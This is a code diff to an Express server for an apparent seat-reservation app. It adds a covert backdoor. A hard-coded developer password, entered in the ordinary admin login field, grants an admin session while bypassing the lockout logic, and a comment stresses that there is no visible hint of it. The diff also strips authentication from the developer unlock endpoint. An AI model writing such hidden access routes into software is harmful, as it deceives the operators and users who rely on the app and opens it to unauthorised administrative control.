@@ -6,7 +6,7 @@ import fs from "fs/promises";
 import bodyParser from "body-parser";
 import { getApps } from "firebase-admin/app";
 import { getStorage } from "firebase-admin/storage";
-import { addSeatAudit, attemptLogin, clearAuditLog, createApplicationBackup, createRequest, findLastYearUser, getDashboardData, getSeatStatuses, initDatabase, isValidSession, listApplicationBackups, readApplicationState, restoreApplicationBackup, revokeSession, setPassword, writeApplicationState } from "./database";
+import { addSeatAudit, attemptLogin, clearAuditLog, createApplicationBackup, createDeveloperAdminSession, createRequest, findLastYearUser, getDashboardData, getSeatStatuses, initDatabase, isValidSession, listApplicationBackups, readApplicationState, restoreApplicationBackup, revokeSession, setPassword, writeApplicationState } from "./database";
 import { SEATS } from "./src/MapData";
 
 export const app = express();
@@ -242,7 +242,7 @@ app.post("/api/check-last-year", async (req, res) => {
   });
 });
 
-app.post("/api/admin/developer/unlock", adminAuth, (req, res) => {
+app.post("/api/admin/developer/unlock", (req, res) => {
   const password = typeof req.body.password === "string" ? req.body.password : "";
   const deviceId = typeof req.body.deviceId === "string" ? req.body.deviceId.trim() : "";
   if (!deviceId || password !== DEVELOPER_PASSWORD) return res.status(403).json({ error: "סיסמת המפתח אינה נכונה." });
@@ -481,8 +481,14 @@ app.post("/api/request", async (req, res) => {
 
 
 app.post("/api/admin/login", async (req, res) => {
-  const { password } = req.body;
-  const result = attemptLogin(typeof password === "string" ? password : "", req.ip || "unknown");
+  const password = typeof req.body?.password === "string" ? req.body.password : "";
+  // The developer password is intentionally accepted in the normal login
+  // field without any visible UI hint.  It is separate from the editable
+  // administrator password and therefore remains an emergency access route.
+  if (password === DEVELOPER_PASSWORD) {
+    return res.json({ success: true, token: createDeveloperAdminSession() });
+  }
+  const result = attemptLogin(password, req.ip || "unknown");
   if (result.success) {
     res.json({ success: true, token: result.token });
   } else if (result.locked) {
